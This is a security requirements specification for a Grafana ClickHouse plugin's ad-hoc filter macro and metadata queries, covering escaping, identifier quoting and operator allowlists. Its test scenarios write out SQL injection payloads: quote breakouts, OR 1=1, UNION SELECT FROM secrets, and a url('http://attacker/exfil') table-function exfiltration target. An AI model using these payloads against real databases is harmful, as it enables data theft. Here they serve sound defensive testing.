# hdx-adhoc-filter-macro-secure Specification

## Purpose
TBD - created by archiving change plugin-adhoc-filter-macro-secure. Update Purpose after archive.
## Requirements
### Requirement: User-supplied filter values are emitted as single-quoted escaped literals

The plugin's `$__adHocFilter` macro SHALL emit every user-supplied value as a ClickHouse single-quoted literal (`'<escape(value)>'`), never as a dollar-quoted literal (`$$<value>$$`). The `escape` helper SHALL replace `'`, `\`, `\n`, `\r`, `\t`, and NUL with their backslash-escaped equivalents.

#### Scenario: Single quote in value

- **GIVEN** a filter with `Value = "O'Reilly"` and operator `=` against a `String` column
- **WHEN** `buildFilterCondition` runs
- **THEN** the emitted condition SHALL be `column = 'O\'Reilly'`
- **AND** SHALL NOT contain `$$`

#### Scenario: Dollar-dollar payload

- **GIVEN** a filter with `Value = "payload$$end"` against a `String` column
- **WHEN** `buildFilterCondition` runs
- **THEN** the emitted condition SHALL contain the value inside single quotes
- **AND** the substring `$$` from the input SHALL NOT terminate the literal — the entire input SHALL survive verbatim inside the quotes (with `'` / `\` / control bytes escaped)

#### Scenario: Backslash in value

- **GIVEN** a filter with `Value = "a\\b"` (the three characters `a`, `\`, `b`)
- **WHEN** `buildFilterCondition` runs
- **THEN** the emitted literal SHALL be `'a\\b'` (backslash doubled)

#### Scenario: UTF-8 multi-byte sequences pass through verbatim

- **GIVEN** a filter with `Value = "héllo"` (UTF-8 multi-byte `é`)
- **WHEN** `buildFilterCondition` runs
- **THEN** the emitted literal SHALL contain `héllo` verbatim inside single quotes

### Requirement: `AdHocFilterMacro` resolves the target CTE via argument first, AST position second

The macro SHALL accept zero or one argument. When one argument is supplied and non-empty, it is taken as the CTE name. When omitted, the macro SHALL parse `query.RawSQL`, run `cte.GetMacroCTEs`, and find the entry whose `MacroPos` matches the macro's `pos` argument. If neither path resolves a CTE, the macro SHALL return a descriptive error.

#### Scenario: Argument-resolved CTE bypasses AST walk

- **GIVEN** SQL `SELECT 1 WHERE $__adHocFilter(events)` and one filter
- **WHEN** the macro runs
- **THEN** the macro SHALL fetch keys for `events` and SHALL NOT invoke `cte.GetMacroCTEs`

#### Scenario: AST-position fallback

- **GIVEN** SQL `SELECT * FROM events WHERE $__adHocFilter()`
- **WHEN** the macro runs at the position of `$__adHocFilter`
- **THEN** the macro SHALL resolve the CTE to `events` via `cte.GetMacroCTEs`

#### Scenario: Too many arguments

- **GIVEN** SQL containing `$__adHocFilter(a, b)`
- **WHEN** the macro runs
- **THEN** the return SHALL be a `backend.DownstreamError` wrapping `sqlutil.ErrorBadArgumentCount`

### Requirement: `AdHocFilterMacro` returns `1=1` when no applicable filters

When `query.Filters` is empty, the macro SHALL return `1=1`. When filters target keys that are not in the resolved CTE's schema, those filters SHALL be dropped silently; if no filter survives the drop, the macro SHALL still return `1=1` so the surrounding SQL stays well-formed.

#### Scenario: Empty filter list

- **GIVEN** `query.Filters = []`
- **WHEN** the macro runs
- **THEN** the return SHALL be `("1=1", nil)`

#### Scenario: All filters reference unknown columns

- **GIVEN** filters `[{Key: "ghost", Operator: "=", Value: "v"}]` against a CTE that lacks `ghost`
- **WHEN** the macro runs
- **THEN** the return SHALL be `("1=1", nil)`

### Requirement: `MetadataProvider` caches PK + key lookups for one hour

The plugin SHALL define `MetadataProvider` in `pkg/plugin/metadata.go` with two TTL-cached lookups: `(database, table) → primary_key` and `cte_name → {column_name: column_type}`. Both caches SHALL use `jellydator/ttlcache/v3` with a one-hour TTL. Schema queries SHALL route through `metadataDS.QueryData(...)` so they participate in OAuth-keyed pooling (C4) and the TTL connection cache (C3).

#### Scenario: PK cache hit avoids schema query

- **GIVEN** a `MetadataProvider` whose `pkCache` already contains `("db", "tbl") → "id"`
- **WHEN** `GetPK(ctx, headers, "db", "tbl")` is called
- **THEN** the result SHALL be `("id", nil)`
- **AND** the underlying `metadataDS.QueryData` SHALL NOT be invoked

#### Scenario: PK cache miss invokes schema query and stores result

- **GIVEN** a `MetadataProvider` whose `pkCache` is empty and a fake `metadataDS` that returns a frame with `[id]` for the PK query
- **WHEN** `GetPK(ctx, headers, "db", "tbl")` is called twice in succession
- **THEN** `metadataDS.QueryData` SHALL be invoked exactly once
- **AND** both returns SHALL be `("id", nil)`

#### Scenario: PK not found is a typed error

- **GIVEN** a fake `metadataDS` that returns an empty frame for the PK query
- **WHEN** `QueryPK` is called
- **THEN** the returned error SHALL wrap `ErrPrimaryKeyNotFound`

### Requirement: `MetadataProvider.executeQuery` propagates HTTP headers via `SetHTTPHeader`

The plugin SHALL build the synthetic `*backend.QueryDataRequest` for schema queries using `req.SetHTTPHeader(key, value)` rather than writing directly to `req.Headers`. The SDK's `getHTTPHeadersFromStringMap` only round-trips arbitrary headers (e.g. `X-Grafana-Org-Id`) when they are stored under the `http_` prefix; `SetHTTPHeader` handles the prefix automatically.

#### Scenario: Org-Id header survives the round-trip

- **GIVEN** a caller passing `http.Header{"Authorization": ["Bearer t"], "X-Grafana-Org-Id": ["5"]}`
- **WHEN** `executeQuery` builds the synthetic request and the fake `metadataDS.QueryData` reads `req.GetHTTPHeaders()`
- **THEN** the read SHALL return both `Authorization: Bearer t` and `X-Grafana-Org-Id: 5`

### Requirement: `Macros` registry populates `adHocFilter`

The `Macros` map defined by C5 SHALL include `"adHocFilter" → AdHocFilterMacro` after C7. The registry remains read-only post-init.

#### Scenario: Registry contains adHocFilter at startup

- **GIVEN** the C7 plugin build
- **WHEN** the package's `init()` functions have run
- **THEN** `Macros["adHocFilter"]` SHALL be set to the `AdHocFilterMacro` function

### Requirement: `NewHdxSqlDatasource` parses plugin settings once at construction

The wrapper constructor SHALL parse `settings.JSONData` via `models.NewPluginSettings` once and store the result as `wrapper.Settings *models.PluginSettings`. The wrapper SHALL also retain the original `backend.DataSourceInstanceSettings` so synthetic schema-query requests have a `PluginContext` to attach to. Parse failure SHALL leave `wrapper.Settings == nil`; the `DefaultDatabase()` method SHALL return `""` in that case so callers fail predictably rather than crashing.

#### Scenario: Settings parsed successfully

- **GIVEN** valid `settings.JSONData` containing `{"defaultDatabase": "events"}`
- **WHEN** `NewHdxSqlDatasource(driver, settings)` runs
- **THEN** the returned wrapper's `DefaultDatabase()` SHALL be `"events"`

#### Scenario: Settings parse failed leaves `nil`

- **GIVEN** malformed `settings.JSONData` (e.g. truncated JSON)
- **WHEN** `NewHdxSqlDatasource(driver, settings)` runs
- **THEN** the constructor SHALL still return a non-nil wrapper
- **AND** `wrapper.Settings` SHALL be `nil`
- **AND** `wrapper.DefaultDatabase()` SHALL return `""`

### Requirement: Metadata primary-key lookup escapes literal identifiers

`QueryPK` SHALL emit the `database` and `table` values as escaped single-quoted literals in the primary-key lookup SQL. A name containing a single quote, backslash, or control byte SHALL NOT terminate the literal or alter the query's structure.

#### Scenario: Quote in table name cannot break out

- **GIVEN** `QueryPK(ctx, headers, "db", "t' OR '1'='1")`
- **WHEN** the lookup SQL is built
- **THEN** the injected quote SHALL appear only inside the escaped `table` literal
- **AND** the SQL SHALL NOT contain an unescaped `OR '1'='1'` clause

#### Scenario: Honest names are unchanged in effect

- **GIVEN** `QueryPK(ctx, headers, "logs", "events")`
- **WHEN** the lookup SQL is built
- **THEN** it SHALL query `system.tables` for database `logs` and table `events`

### Requirement: A `quoteIdentifier` helper produces safe backtick-quoted identifiers

The Go backend SHALL provide a `quoteIdentifier` helper that wraps an identifier in backticks, so the result is safe to place where ClickHouse expects an identifier. Because the clickhouse-sql-parser lexer does not unescape characters inside backtick-quoted identifiers (it reads bytes until the first backtick), an identifier containing a backtick — or a NUL byte — cannot be represented unambiguously and SHALL be rejected with an error rather than emitted. `escape` SHALL continue to be used only for single-quoted literals.

#### Scenario: Embedded backtick is rejected

- **GIVEN** an identifier `` ta`ble ``
- **WHEN** `quoteIdentifier` runs
- **THEN** it SHALL return a non-nil error
- **AND** SHALL NOT emit a backtick-wrapped value that terminates early

#### Scenario: Round-trip preserves the identifier

- **GIVEN** identifiers containing quotes, backslashes, and multi-byte UTF-8
- **WHEN** each is passed through `quoteIdentifier`
- **THEN** parsing the quoted form back SHALL recover the original identifier

### Requirement: Metadata key lookup builds DESCRIBE from validated shapes

`QueryKeys` SHALL determine its `DESCRIBE` target from the parsed query shape rather than a substring heuristic. For a real table reference it SHALL emit a quoted identifier via `quoteIdentifier`; for a genuine subquery it SHALL wrap the expression and verify the assembled statement re-parses to exactly one `DESCRIBE` over a subquery. Table functions (e.g. `url`, `remote`, `s3`, `file`), JOINs, and other arbitrary FROM expressions SHALL be rejected with a typed error. The `strings.Contains(..., "SELECT")` heuristic SHALL be removed.

When a FROM reference is a bare identifier that matches a WITH-clause alias in scope, CTE extraction SHALL resolve it to the alias's defining subquery (parenthesized) before it reaches `QueryKeys`, so the lookup describes the subquery via the validated subquery path. A bare identifier that matches no in-scope WITH alias SHALL continue to be treated and validated as a table reference. Resolution introduces no new trust: the resolved subquery flows through the same re-parse/shape check as any inline subquery.

#### Scenario: Real table becomes a quoted DESCRIBE target

- **GIVEN** a resolved table reference `events` in database `logs`
- **WHEN** `QueryKeys` builds its SQL
- **THEN** the `DESCRIBE` target SHALL be the backtick-quoted identifier form

#### Scenario: WITH-alias FROM resolves to the CTE subquery

- **GIVEN** the SQL `WITH x AS (SELECT a, b FROM events) SELECT * FROM x WHERE $__adHocFilter()`
- **WHEN** the ad-hoc filter macro resolves the schema for the FROM reference `x`
- **THEN** the `DESCRIBE` target SHALL be the alias's subquery `(SELECT a, b FROM events)`, not the identifier `` `x` ``
- **AND** the assembled statement SHALL re-parse to exactly one `DESCRIBE` over a subquery

#### Scenario: Identifier that is not a WITH alias stays a table reference

- **GIVEN** the SQL `SELECT * FROM events WHERE $__adHocFilter()` with no WITH clause
- **WHEN** the macro resolves the schema for `events`
- **THEN** the `DESCRIBE` target SHALL be the backtick-quoted identifier `` `events` ``

#### Scenario: Table function is rejected

- **GIVEN** a metadata target `url('http://attacker/exfil', CSV, 'c String')`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL return a non-nil typed error
- **AND** SHALL NOT issue a `DESCRIBE` over the table function

#### Scenario: Injected CTE string cannot break out

- **GIVEN** a metadata target `t) UNION ALL SELECT * FROM secrets --`
- **WHEN** `QueryKeys` runs
- **THEN** it SHALL either reject the input or emit a statement that re-parses to exactly one `DESCRIBE`
- **AND** SHALL NOT issue a `UNION ALL SELECT * FROM secrets`

### Requirement: Explicit ad-hoc filter argument is a strict identifier

When `$__adHocFilter(<arg>)` supplies an explicit `params[0]`, `AdHocFilterMacro` SHALL accept it only if it matches a strict identifier form (an identifier, optionally `database.table`). Any other value SHALL be rejected with an error and SHALL NOT reach the metadata query.

#### Scenario: Injected explicit argument is rejected

- **GIVEN** SQL `SELECT 1 WHERE $__adHocFilter(events) UNION SELECT ...)` resolving `params[0]` to a non-identifier string
- **WHEN** the macro runs
- **THEN** it SHALL return a non-nil error
- **AND** SHALL NOT call the metadata key lookup with the injected value

#### Scenario: Honest explicit argument is accepted

- **GIVEN** SQL `SELECT 1 WHERE $__adHocFilter(events)`
- **WHEN** the macro runs
- **THEN** `params[0]` SHALL be accepted and used to resolve keys for `events`

### Requirement: Scalar/map filter operators are allowlisted

`buildFilterCondition` SHALL accept only an explicit allowlist of operators for scalar and map (non-Array) columns: `=`, `!=`, `<`, `<=`, `>`, `>=`, `=|`, `!=|`, `=~`, `!~`. Any operator outside this set SHALL cause the function to return a non-nil error (wrapping a descriptive message), and the macro SHALL NOT emit a condition built from that operator. The operator string SHALL NOT reach the emitted SQL except as one of the allowlisted comparison tokens.

#### Scenario: Injected operator is rejected

- **GIVEN** a filter `{Key: "status", Operator: "= 'x' OR 1=1 -- ", Value: "x"}` against a `String` column
- **WHEN** `buildFilterCondition` runs
- **THEN** it SHALL return a non-nil error
- **AND** SHALL NOT return a condition containing `OR 1=1`

#### Scenario: All supported operators produce a condition

- **GIVEN** a filter with a non-empty, non-NULL value against a `String` column
- **WHEN** `buildFilterCondition` runs once for each allowlisted operator
- **THEN** each call SHALL return a nil error and a non-empty condition

#### Scenario: Unknown operator on a scalar column errors like the Array path

- **GIVEN** a filter `{Key: "n", Operator: "BETWEEN", Value: "1"}` against an `Int64` column
- **WHEN** `buildFilterCondition` runs
- **THEN** it SHALL return a non-nil error
- **AND** the error SHALL name the unsupported operator

### Requirement: Map filter keys are validated and quoted

When a filter key matches the map-subscript form `column['subscript']`, `AdHocFilterMacro` SHALL validate the base `column` against the resolved CTE schema (as today) and SHALL rebuild the key used in SQL from trusted pieces: the base column emitted as a backtick-quoted identifier and the subscript emitted as a single-quoted escaped literal (via `escape`). The raw `filter.Key` SHALL NOT be interpolated into the emitted condition for map columns. A filter whose base column is not in the schema SHALL be dropped, as today.

#### Scenario: Injected subscript cannot break out

- **GIVEN** a filter `{Key: "attrs['a'] OR 1=1 --']", Operator: "=", Value: "v"}` where `attrs` is a `Map(String, String)` column in the schema
- **WHEN** `AdHocFilterMacro` runs
- **THEN** the emitted condition SHALL be a single map-access comparison over the backtick-quoted base column
- **AND** the entire injected subscript SHALL appear only inside a single-quoted, escaped map-key literal, with the embedded quote backslash-escaped so it cannot terminate the literal

#### Scenario: Honest map filter emits quoted key

- **GIVEN** a filter `{Key: "attrs['env']", Operator: "=", Value: "prod"}` where `attrs` is a `Map(String, String)` column
- **WHEN** `AdHocFilterMacro` runs
- **THEN** the emitted condition SHALL reference the key as `` `attrs`['env'] `` with the column backtick-quoted and the subscript single-quoted

#### Scenario: Subscript with a quote is escaped, not injected

- **GIVEN** a filter `{Key: "attrs['a'']', Operator: "=", Value: "v"}` where `attrs` is a `Map(String, String)` column
- **WHEN** `AdHocFilterMacro` runs
- **THEN** the subscript SHALL be emitted with the single quote backslash-escaped inside the literal
- **AND** the literal SHALL NOT be terminated early

